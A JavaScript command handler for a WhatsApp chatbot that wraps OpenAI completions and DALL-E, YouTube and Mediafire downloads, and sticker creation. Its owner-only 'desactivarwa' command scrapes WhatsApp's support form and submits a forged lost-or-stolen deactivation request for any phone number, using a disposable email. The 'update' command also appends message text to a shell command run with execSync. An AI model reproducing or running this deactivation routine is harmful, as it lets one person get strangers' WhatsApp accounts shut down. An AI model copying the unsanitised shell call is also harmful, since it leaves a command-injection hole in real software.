"use strict";
process.on('uncaughtException', console.error)
const { downloadContentFromMessage, downloadMediaMessage } = require("@adiwajshing/baileys");
const { color, bgcolor } = require("../lib/color");
const fetch = require("node-fetch");
const fs = require("fs");
const moment = require("moment-timezone");
const util = require("util");
const { exec, spawn, execSync } = require("child_process");
let setting;
const { ownerNumber, MAX_TOKEN, OPENAI_KEY } = setting = require('../config.json');
const speed = require("performance-now");
let { ytv } = require('../lib/y2mate')
const ffmpeg = require("fluent-ffmpeg");
let { ytmp4, ytmp3, ytplay, ytplayvid } = require('../lib/youtube')
const { mediafireDl } = require('../lib/myfunc')
const axios = require("axios");
const cheerio = require("cheerio");

moment.tz.setDefault("Asia/Jakarta").locale("id");

module.exports = async (conn, msg, m, openai) => {
  try {
    if (msg.key.fromMe) return
    const { type, isQuotedMsg, quotedMsg, mentioned, now, fromMe } = msg;
    const toJSON = (j) => JSON.stringify(j, null, "\t");
    const from = msg.key.remoteJid;
    const chats = type === "conversation" && msg.message.conversation ? msg.message.conversation : type === "imageMessage" && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : type === "videoMessage" && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : type === "extendedTextMessage" && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : type === "buttonsResponseMessage" && quotedMsg.fromMe && msg.message.buttonsResponseMessage.selectedButtonId ? msg.message.buttonsResponseMessage.selectedButtonId : type === "templateButtonReplyMessage" && quotedMsg.fromMe && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : type === "messageContextInfo" ? msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId : type == "listResponseMessage" && quotedMsg.fromMe && msg.message.listResponseMessage.singleSelectReply.selectedRowId ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : "";
    const args = chats.split(" ");
    const prefix = /^[°•π÷×¶∆£¢€¥®™✓=|~+×_*!#%^&./\\©^]/.test(chats) ? chats.match(/^[°•π÷×¶∆£¢€¥®™✓=|~+×_*!#,|÷?;:%^&./\\©^]/gi) : null;
    const command = prefix ? chats.slice(1).trim().split(' ').shift().toLowerCase() : ''
    const isGroup = msg.key.remoteJid.endsWith("@g.us");
    const groupMetadata = msg.isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
    const groupName = msg.isGroup ? groupMetadata.subject : ''  
    const sender = isGroup ? msg.key.participant ? msg.key.participant : msg.participant : msg.key.remoteJid;
    const userId = sender.split("@")[0]
    const botNumber = conn.user.id.split(":")[0] + "@s.whatsapp.net";
    const isOwner = [botNumber,...ownerNumber].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(sender)
    const pushname = msg.pushName;
    const q = chats.slice(command.length + 1, chats.length);
    const isCmd = chats.startsWith(prefix)
    const content = JSON.stringify(msg.message)
    const isImage = (type == 'imageMessage')
    const isVideo = (type == 'videoMessage')
    const isAudio = (type == 'audioMessage')
    const isSticker = (type == 'stickerMessage')
    const isViewOnce = (type == 'viewOnceMessageV2')
    const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false    
    const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
    const textolink = decodeURIComponent(chats.replace(command, '').replace(prefix, '').split(' ').join(''))  
    const textosinespacio = decodeURIComponent(chats.replace(command, '').replace(prefix, ''))
    //let banchat = JSON.parse(fs.readFileSync('../lib/database/banChat.json'));
    //const isBanChat = isGroup ? banchat.includes(from) : false
 
/* Envios de mensajes */ 
    
const reply = (teks) => {
conn.sendMessage(from, { text: teks }, { quoted: msg });
};
const tempButton = async (remoteJid, text, footer, content) => {
const templateMessage = { viewOnceMessage: { message: { templateMessage: { hydratedTemplate: { hydratedContentText: text, hydratedContentFooter: footer, hydratedButtons: content, }, }, }, }, };
const sendMsg = await conn.relayMessage(remoteJid, templateMessage, {}); 
};
const sendAud = (link) => { 
conn.sendMessage(from, { audio: { url: link }, fileName: `error.mp3`, mimetype: 'audio/mp4' }, { quoted: msg });
};
const sendVid = (link, thumbnail) => {
conn.sendMessage( from, { video: { url: link }, fileName: `error.mp4`, thumbnail: thumbnail, mimetype: 'video/mp4' }, { quoted: msg });
};      
const sendImgUrl = (link) => {
conn.sendMessage( from, { image: { url: link }, fileName: `error.jpg` }, { quoted: msg });
};         
      
/* Auto Read & Presence Online */
conn.readMessages([msg.key]);
conn.sendPresenceUpdate("available", from);

    // Logs;
    if (!isGroup && isCmd && !fromMe) {
      console.log("->[\x1b[1;32mCMD\x1b[1;37m]", color(moment(msg.messageTimestamp * 1000).format("DD/MM/YYYY HH:mm:ss"), "yellow"), color(`${command} [${args.length}]`), "from", color(pushname));
    }
    if (isGroup && isCmd && !fromMe) {
      console.log("->[\x1b[1;32mCMD\x1b[1;37m]", color(moment(msg.messageTimestamp * 1000).format("DD/MM/YYYY HH:mm:ss"), "yellow"), color(`${command} [${args.length}]`), "from", color(pushname), "in", color(groupName));
    }

switch (command) {
case 'kssgsgsgvzs': case 'shvsbzzjsb':
var textReply = `Hai,
Saya adalah bot AI _(ChatGPT)_ yang dapat membantu Anda menjawab beberapa pertanyaan.

*AI* adalah Kecerdasan Buatan yang ditambahkan kepada suatu sistem yang bisa diatur dalam konteks ilmiah atau bisa disebut juga intelegensi artifisial atau hanya disingkat AI, didefinisikan sebagai kecerdasan entitas ilmiah.

Selain itu kami juga menyediakan beberapa fitur tambahan seperti di bawah ini...

*Rules Bot :* 
1. Jangan Spam Bot karena bot hanya dapat menjawab satu per satu pertanyaan
2. Jika ada fitur yang tidak bekerja silahkan lapor owner agar di perbaiki
3. Bot masih dalam tahap pengembangan
4. User bisa request fitur baru untuk bot

*Harap untuk mematuhi rules bot untuk kenyamanan all user bot*

*Bot Merespon dalam Limit ${MAX_TOKEN} Command Maximal*

*Fitur Tambahan:*
〆 *${prefix}start*       : _untuk memulai chat_
〆 *${prefix}ping*        : _kecepatan respon_
〆 *${prefix}runtime*     : _waktu berjalan_
〆 *${prefix}play*        : _mencari video or audio di yt_
〆 *${prefix}play2*       : _mencari video or audio di yt_
〆 *${prefix}ytmp3*       : _download audio dari link yt_
〆 *${prefix}ytmp4*       : _download video yt ke galeri_
〆 *${prefix}chatgpt*     : _ChatGpt seperti AI_
〆 *${prefix}dall-e*      : _menciptakan gambar dari sebuah kata_
〆 *${prefix}mediafiredl* : _download link mediafire_

*Fitur khusus Developer:*
〆 *${prefix}update*
〆 *${prefix}desactivarwa*

Developer @Ryan Aditya 𝙭 @ZeEx Ferdy`
var templateButtons = [
{index: 1, urlButton: {displayText: 'Developer 1', url: 'https://wa.me/62822522851432'}},
{index: 2, urlButton: {displayText: 'Developer 2', url: 'https://wa.me/62823504965328'}},
{index: 3, urlButton: {displayText: 'Grup Official 🔗', url: 'https://chat.whatsapp.com/I47cTfEwzIC391KPBjbTPq'}}]
let templateMessage = { image: {url: 'https://www.mizanurrmizan.info/wp-content/uploads/2023/02/chatgpt.jpg'}, caption: textReply, footer: null, templateButtons: templateButtons, viewOnce: true };
conn.sendMessage(from, templateMessage, { quoted: msg });
break
case 'runtime':
reply(require('../lib/myfunc').runtime(process.uptime()))
break
case 'menu':
var timestamp = speed();
var latensi = speed() - timestamp
reply(`*KECEPATAN RESPON BOT: ${latensi.toFixed(4)}s*

Hola @${senderJid.split`@`[0] || pushname || 'user'} 👋

Spanyol : Soy un Bot de WhatsApp que usa la inteligencia artificial de OpenAI (ChatGPT), fui creado para responder a tus preguntas. Envíame una pregunta y te responderé!. 
Indonesia : Saya adalah Bot WhatsApp yang menggunakan kecerdasan buatan OpenAI (ChatGPT), saya diciptakan untuk menjawab pertanyaan Anda. Kirimi saya pertanyaan dan saya akan menjawab Anda!.

Spanyol : _El Bot se limita a responder ${MAX_TOKEN} palabras como máximo_
Indonesia : _Bot dibatasi untuk menjawab paling banyak ${MAX_TOKEN} kata_

Note : 
❏ Jika Bot tidak merespon perintah,kemungkinan fitur error atau masalah sinyal yang delay
❏ Bot ini adalah bot AI Atau Bot Kecerdasan Buatan

*Menu Utama*
❏ .start 
❏ .ping
❏ .runtime
❏ .ai
❏ .chatgpt
❏ .dall-e
❏ .mediafiredl

*Menu Khusus Pemilik Bot*
❏ .update
❏ .desactivarwa`)
break     
case 'play':
if (!args[1]) return reply(`*[❗] Nama lagu tidak ada, harap masukkan perintah plus nama, judul, atau tautan lagu atau video YouTube apa pun*\n\n*—◉ Contoh:*\n*◉ ${prefix + command} Good Feeling - Flo Rida*`)        
let res = await fetch(`https://api.lolhuman.xyz/api/ytplay2?apikey=BrunoSobrino&query=${textosinespacio}`) 
let json = await res.json()
let kingcore = await ytplay(textosinespacio)
let audiodownload = json.result.audio
if (!audiodownload) audiodownload = kingcore.result
sendAud(`${audiodownload}`)
break
case 'play2':
if (!args[1]) return reply(`*[❗] Harap Masukkan Judul Pemcarian*\n\n*—◉ Contoh:*\n*◉ ${prefix + command} Good Feeling - Flo Rida*`)        
let mediaa = await ytplayvid(textosinespacio)
sendVid(mediaa.result, `${mediaa.thumb}`)
break   
case 'ytmp3':
if (!args[1]) return reply(`*[❗] Harap Masukkan Link Youtube Yang Ingin Di Download*\n\n*—◉ Contoh:*\n*◉ ${prefix + command}* https://youtu.be/WEdvakuztPc`)    
let ress22 = await fetch(`https://api.lolhuman.xyz/api/ytaudio2?apikey=BrunoSobrino&url=${textolink}`) 
let jsonn22 = await ress22.json()
let kingcoreee2 = await ytmp3(textolink)
let audiodownloaddd2 = jsonn22.result.link
if (!audiodownloaddd2) audiodownloaddd2 = kingcoreee2.result
sendAud(`${audiodownloaddd2}`)    
break        
case 'ytmp4':
if (!args[1]) return reply(`*[❗] Harap Masukkan Link Youtube Yang Ingin Di Download*\n\n*—◉ Contoh:*\n*◉ ${prefix + command}* https://youtu.be/WEdvakuztPc`)    
let ress2 = await fetch(`https://api.lolhuman.xyz/api/ytvideo?apikey=BrunoSobrino&url=${textolink}`) 
let jsonn2 = await ress2.json()
let kingcoreee = await ytmp4(textolink)
let videodownloaddd = jsonn2.result.link.link
if (!videodownloaddd) videodownloaddd = kingcoreee.result
sendVid(videodownloaddd, `${kingcoreee.thumb}`)    
break    
case 'dall-e': case 'draw': 
if (!args[1]) return reply(`*[❗] Masukkan teks yang akan menjadi tema gambar dan gunakan fungsi AI Dall-E*\n\n*—◉ Contoh permintaan:*\n*◉ ${prefix + command} anak kucing menangis*\n*◉ ${prefix + command} hatsune miku beso*`)    
try {       
const responsee = await openai.createImage({ prompt: textosinespacio, n: 1, size: "512x512", });    
sendImgUrl(responsee.data.data[0].url)        
} catch (jj) {
reply("*[❗] Sedang Mencari Server Terbaik.....*\n\n*—◉ Mohon menunggu....:*\n" + jj)       
try {      
sendImgUrl(`https://api.lolhuman.xyz/api/dall-e?apikey=BrunoSobrino&text=${textosinespacio}`)  
} catch (jj2) {
reply("*[❗] Error Code 2, tidak ada gambar  yang diperoleh AI...*\n\n*—◉ Error:*\n" + jj2)        
}}
break
case 'chatgpt': case 'ai': 
if (!args[1]) return reply(`*[❗] Masukkan Teks Untuk Menggunakan Fitur ChatGPT*\n\n*—◉ Contoh Penggunaan:*\n*◉ ${prefix + command} Reflexion sobre la serie Merlina 2022 de netflix*\n*◉ ${prefix + command} Codigo en JS para un juego de cartas*`)           
try {
const BotIA = await openai.createCompletion({ model: "text-davinci-003", prompt: textosinespacio, temperature: 0.3, max_tokens: MAX_TOKEN, stop: ["Ai:", "Human:"], top_p: 1, frequency_penalty: 0.2, presence_penalty: 0, })
reply(BotIA.data.choices[0].text.trim())
} catch (qe) {
reply("*[❗] Sedang Mencari Server Terbaik......:*\n\n*—◉ Mohon menunggu....::*\n" + qe)       
try {    
let tioress = await fetch(`https://api.lolhuman.xyz/api/openai?apikey=BrunoSobrino&text=${textosinespacio}&user=user-unique-id`)
let hasill = await tioress.json()
reply(`${hasill.result}`.trim())   
} catch (qqe) {        
reply("*[❗] Kesalahan server.*\n\n*—◉ Error:*\n" + qqe)  
}} 
break
case 'update':
if (!isOwner) return reply('*[❗] Maaf Fitur ini hanya dapat digunakan oleh developer Bot*')    
try {    
let stdout = execSync('git pull' + (m.fromMe && q ? ' ' + q : ''))
await reply(stdout.toString()) 
} catch { 
let updatee = execSync('git remote set-url origin https://github.com/BrunoSobrino/openai-botwa.git && git pull')
await reply(updatee.toString())}  
break
case 'desactivarwa':      
if (!isOwner) return reply('*[❗] Perintah ini hanya dapat digunakan oleh Pemilik Bot*')    
if (!q || !args[1]) return reply(`*[❗] Masukkan nomor, contoh ${prefix + command} +1 (450) 999-999*`)
let ntah = await axios.get("https://www.whatsapp.com/contact/noclient/")
let email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let ressss = await axios({ url, method: "POST", data: form, headers: { cookie } })
var payload = String(ressss.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##\n\nHola,\n\nGracias por tu mensaje.\n\nHemos desactivado tu cuenta de WhatsApp. Esto significa que su cuenta está deshabilitada temporalmente y se eliminará automáticamente en 30 días si no vuelve a registrar la cuenta. Tenga en cuenta: el equipo de atención al cliente de WhatsApp no puede eliminar su cuenta manualmente.\n\nDurante el período de cierre:\n • Es posible que sus contactos en WhatsApp aún vean su nombre y foto de perfil.\n • Cualquier mensaje que sus contactos puedan enviar a la cuenta permanecerá en estado pendiente por hasta 30 días.\n\nSi desea recuperar su cuenta, vuelva a registrar su cuenta lo antes posible.\nVuelva a registrar su cuenta ingresando el código de 6 dígitos, el código que recibe por SMS o llamada telefónica. Si te vuelves a registrar\n\nSi tiene alguna otra pregunta o inquietud, no dude en ponerse en contacto con nosotros. Estaremos encantados de ayudar!`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##\n\nHola:\n\nGracias por tu mensaje.\n\nPara proceder con tu solicitud, necesitamos que verifiques que este número de teléfono te pertenece. Por favor, envíanos documentación que nos permita verificar que el número es de tu propiedad, como una copia de la factura telefónica o el contrato de servicio.\n\nPor favor, asegúrate de ingresar tu número de teléfono en formato internacional completo. Para obtener más información sobre el formato internacional, consulta este artículo.\n\nSi tienes alguna otra pregunta o inquietud, no dudes en contactarnos. Estaremos encantados de ayudarte.`)
} else reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
break   
case 'mediafiredl':
let resss2 = await mediafireDl(textosinespacio)
let caption = `
*📓 Nama:* ${resss2.name}
*📁 Size:* ${resss2.size}
*📄 Jenis:* ${resss2.mime}\n
*⏳ Harap Menunggu saya sedang mengirim file anda. . . .* 
`.trim()
await reply(caption)
await conn.sendMessage(from, { document : { url: resss2.link }, fileName: resss2.name, mimetype: resss2.mime.toUpperCase() }, { quoted: msg })       
break
   
/*case 'banchat': 
//if (!isOwner) return
if (args[0] === "ban") {
banchat.push(from)
var groupe = await conn.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
} else if (args[0] === "unban") {
let off = banchat.indexOf(from)
banchat.splice(off, 1)
} else {
reply('Bna o unban')
}}
break*/
    
case 'sticker': case 's':
try {        
const pname = 'OpenAI Bot - By Ryan X ZeEx\nBot Number\nwa.me/+62823504965327'
const athor = '+' + conn.user.id.split(":")[0];
if (isImage || isQuotedImage) {
await conn.downloadAndSaveMediaMessage(msg, "image", `./tmp/${sender.split("@")[0]}.jpeg`)
var media = fs.readFileSync(`./tmp/${sender.split("@")[0]}.jpeg`)
var opt = { packname: pname, author: athor }
conn.sendImageAsSticker(from, media, msg, opt)
fs.unlinkSync(`./tmp/${sender.split("@")[0]}.jpeg`)
} else {
if(isVideo || isQuotedVideo) {
var media = await conn.downloadAndSaveMediaMessage(msg, 'video', `./tmp/${sender}.jpeg`)
var opt = { packname: pname, author: athor }
conn.sendImageAsSticker(from, media, msg, opt)
fs.unlinkSync(media)
} else {
const imageBuffer = await downloadMediaMessage(msg, 'buffer', {}, {});
let filenameJpg = "stk.jpg";
fs.writeFileSync(filenameJpg, imageBuffer);
await ffmpeg('./' + filenameJpg).input(filenameJpg).on('start', function(cmd){
console.log(`Started: ${cmd}`)
}).on('error', function(err) {
console.log(`Error: ${err}`);
reply('error')}).on('end', async function() {
console.log('Finish')
await conn.sendMessage(from, {sticker: {url:'stk.webp'}})
}).addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`]).toFormat('webp').save('stk.webp');
}}} catch {     
reply(`*[❗] Balas gambar, gif atau video, yang akan diubah menjadi stiker, ingat bahwa Anda harus mengirim gambar atau membalas gambar dengan perintah ${prefix + command}*`)        
}
break 
default:
const botNumber22 = '@' + conn.user.id.split(":")[0];
if (!chats.startsWith(botNumber22) && isGroup) return
if (isImage || isVideo || isSticker || isViewOnce || isAudio) return
let chatstext = chats.replace(conn.user.id.split(":")[0].split("@")[0], '')
if (isGroup) chatstext = chatstext.replace("@", '').replace(prefix, '')
console.log("->[\x1b[1;32mNew\x1b[1;37m]", color('Pregunta De', 'yellow'), color(pushname, 'lightblue'), `: "${chatstext}"`)
conn.sendPresenceUpdate("composing", from);
try {
const response = await openai.createCompletion({ model: "text-davinci-003", prompt: chatstext, temperature: 0.3, max_tokens: MAX_TOKEN, stop: ["Ai:", "Human:"], top_p: 1, frequency_penalty: 0.2, presence_penalty: 0, })
reply(response.data.choices[0].text.trim())
} catch (eee) {
//reply("*[❗] Kesalahan server 2, tidak ada tanggapan dari AI...*\n\n*—◉ Error:*\n" + eee)       
try {    
let tiores = await fetch(`https://api.lolhuman.xyz/api/openai?apikey=BrunoSobrino&text=${chatstext}&user=user-unique-id`)
let hasil = await tiores.json()
reply(`${hasil.result}`.trim())   
} catch (eeee) {        
reply("*[❗]  Kesalahan server 2, tidak ada tanggapan dari AI...*\n\n*—◉ Error:*\n" + eeee)  
}} 
break
}} catch (err) {
console.log(color("[ERROR]", "red"), err); }};
